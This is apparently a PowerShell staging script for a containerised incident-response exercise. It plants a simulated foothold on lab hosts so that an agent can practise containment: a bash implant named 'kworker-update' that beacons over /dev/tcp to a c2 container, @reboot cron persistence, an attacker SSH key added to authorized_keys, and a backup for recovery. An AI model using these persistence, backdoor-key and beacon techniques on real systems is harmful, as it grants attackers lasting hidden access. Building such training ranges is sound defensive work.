<#
  Plants a live, VERIFIABLE attacker foothold on the sim hosts, so containment and eradication have
  something visible to stop:
    - an implant (/usr/local/bin/kworker-update) that beacons to the c2 container every 10 seconds and
      writes "beacon ok" / "beacon FAILED" to /var/log/app.log  -> the agent sees it via follow_logs
    - a persistence file (/etc/cron.d/kworker-update)          -> eradicate with quarantine_file
    - an attacker SSH key in /home/jdoe/.ssh/authorized_keys    -> eradicate with quarantine_file
    - a pre-attack backup in /srv/.backup                       -> recover with restore_from_backup

  Run it right after reset.ps1 and BEFORE the attack encrypts anything (the backup is taken here).
  Easiest: add this line near the top of your attack script:   & "$PSScriptRoot\stage-implant.ps1"
#>
param([string[]]$Hosts = @('file-01', 'web-01'))

$c2 = (docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' c2).Trim()
if (-not $c2) { Write-Host "c2 container not found. Run reset.ps1 first." -ForegroundColor Red; exit 1 }

# Sent to bash on stdin, so no PowerShell quoting problems. CRLF is stripped below.
$script = @'
set -e
mkdir -p /srv/.backup
for d in /srv/hr /srv/finance; do if [ -d "$d" ]; then rm -rf "/srv/.backup/$(basename $d)"; cp -a "$d" /srv/.backup/; fi; done

cat > /usr/local/bin/kworker-update <<'IMPLANT'
#!/bin/bash
# Simulated implant for the demo: beacons to the attacker's server every 10 seconds.
while true; do
  if timeout 3 bash -c 'echo beacon > /dev/tcp/__C2__/8080' 2>/dev/null; then r="beacon ok"; else r="beacon FAILED"; fi
  echo "$(date '+%b %d %H:%M:%S') $(hostname) kworker-update[$$]: $r to __C2__:8080" >> /var/log/app.log
  sleep 10
done
IMPLANT
chmod +x /usr/local/bin/kworker-update
echo '@reboot root /usr/local/bin/kworker-update' > /etc/cron.d/kworker-update

if id jdoe >/dev/null 2>&1; then
  mkdir -p /home/jdoe/.ssh
  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDemoOnlyAttackerPlantedKeyNotARealKey000000 attacker@c2' >> /home/jdoe/.ssh/authorized_keys
fi

if ! pgrep -f /usr/local/bin/kworker-update >/dev/null; then
  setsid nohup /usr/local/bin/kworker-update >/dev/null 2>&1 < /dev/null &
fi
echo "staged on $(hostname): implant beaconing to __C2__:8080, persistence + planted key in place, backup in /srv/.backup"
'@

$script = ($script -replace "`r", "").Replace('__C2__', $c2) + "`n"
foreach ($h in $Hosts) { $script | docker exec -i $h bash }
